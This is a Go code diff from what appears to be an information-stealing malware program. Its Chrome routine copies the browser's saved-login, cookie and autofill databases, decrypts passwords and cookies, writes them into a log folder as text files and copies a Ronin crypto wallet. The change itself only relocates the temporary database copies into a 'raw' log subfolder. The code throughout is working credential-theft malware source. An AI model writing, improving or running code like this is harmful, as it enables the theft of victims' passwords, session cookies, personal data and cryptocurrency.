@@ -20,9 +20,9 @@ func Chrome(browserPath, logFolderPath string) {
 		log.Println(err)
 	}
 
-	browserPasswords := getChromePasswords(browserPath, browserKey)
-	browserCookies := getChromeCookies(browserPath, browserKey)
-	browserAutofill := getChromeAutofill(browserPath)
+	browserPasswords := getChromePasswords(browserPath, logFolderPath, browserKey)
+	browserCookies := getChromeCookies(browserPath, logFolderPath, browserKey)
+	browserAutofill := getChromeAutofill(browserPath, logFolderPath)
 
 	err = os.WriteFile(path.Join(logFolderPath, "Browsers", "Chrome", "Passwords.txt"), []byte(browserPasswords), 0644)
 	if err != nil {
@@ -43,13 +43,13 @@ func Chrome(browserPath, logFolderPath string) {
 	wallets.CopyRoninChrome(browserPath, logFolderPath)
 }
 
-func getChromePasswords(browserPath string, key []byte) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(browserPath, "Default", "chrome_login_data"))
+func getChromePasswords(browserPath, logFolderPath string, key []byte) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Login Data"), path.Join(logFolderPath, "raw", "chrome_login_data"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
 	}
 
-	sqllitePath := path.Join(browserPath, "Default", "chrome_login_data")
+	sqllitePath := path.Join(logFolderPath, "raw", "chrome_login_data")
 
 	var data string
 
@@ -81,8 +81,8 @@ func getChromePasswords(browserPath string, key []byte) string {
 	return data
 }
 
-func getChromeCookies(browserPath string, key []byte) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(browserPath, "Default", "Network", "chrome_cookies"))
+func getChromeCookies(browserPath, logFolderPath string, key []byte) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Network", "Cookies"), path.Join(logFolderPath, "raw", "chrome_cookies"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
 	}
@@ -119,8 +119,8 @@ func getChromeCookies(browserPath string, key []byte) string {
 	return data
 }
 
-func getChromeAutofill(browserPath string) string {
-	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(browserPath, "Default", "chrome_web_data"))
+func getChromeAutofill(browserPath, logFolderPath string) string {
+	_, err := utils.CopyFile(path.Join(browserPath, "Default", "Web Data"), path.Join(logFolderPath, "raw", "chrome_web_data"))
 	if err != nil {
 		log.Println(fmt.Sprintf("[CHROME] %s", err.Error()))
 	}
